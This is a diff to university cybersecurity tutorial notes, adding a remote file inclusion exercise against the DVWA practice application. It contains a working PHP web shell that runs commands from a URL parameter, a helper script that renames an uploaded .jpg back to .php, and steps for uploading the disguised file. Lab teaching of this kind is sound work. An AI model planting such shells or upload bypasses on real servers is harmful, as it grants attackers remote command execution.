@@ -6,6 +6,8 @@
   - [1.5 Setting up a spoofing attack with Ettercap - ARP Spoofing](#15-setting-up-a-spoofing-attack-with-ettercap---arp-spoofing)
   - [1.6 Modifying the data between the client and the server](#16-modifying-the-data-between-the-client-and-the-server)
   - [](#)
+  - [File Inclusion](#file-inclusion)
+  - [Remote file inclusion](#remote-file-inclusion)
 
 ----------
 
@@ -118,3 +120,25 @@ username = admin / pswrd = admin
 
    <img src="https://github.com/mr-desilva/6COSC019C-Cyber-Security/blob/main/Tutorial%204/images/img15.png">
 
+----------
+### File Inclusion
+### Remote file inclusion
+- Create two php files including this code.
+  - webshell.php
+
+```php
+<?
+system($_GET['cmd']);
+echo '<from method="post" action="../../hackable/uploads/webshell.php"><input type="text" name="cmd" /></form>';
+?>
+```
+  - rename.php
+```php
+<?
+system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/webshell.php');
+?>
+```
+- Change the .php extension to .jpg using `cp webshell.php webshell.jpg` , do this for both files
+
+- Go to dvwa and upload the webshell.jpg file.
+  <img src="https://github.com/mr-desilva/6COSC019C-Cyber-Security/blob/main/Tutorial%204/images/img16.png">
